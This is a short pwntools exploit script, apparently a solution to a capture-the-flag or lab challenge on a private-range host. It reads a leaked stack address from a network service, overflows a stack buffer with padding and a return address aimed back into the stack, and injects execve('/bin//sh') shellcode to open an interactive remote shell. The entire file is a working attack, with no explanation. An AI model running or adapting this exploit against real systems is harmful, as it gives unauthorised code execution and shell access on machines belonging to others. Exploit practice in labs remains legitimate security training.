from pwn import *

context(arch="amd64", os="linux", endian="little")

r = remote("10.10.208.100", 9004)

r.recvuntil(b"at ")

rsp_addr = int(r.recvline()[:-1], 16)

log.success(f"Leaked RSP: 0x{rsp_addr:x}")

padding = b"\x00" * 0x58
ret_overwrite = p64(rsp_addr + 0x60)
shellcode = asm("""
    xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
""", arch="amd64")

r.send(padding + ret_overwrite + shellcode)

r.interactive()
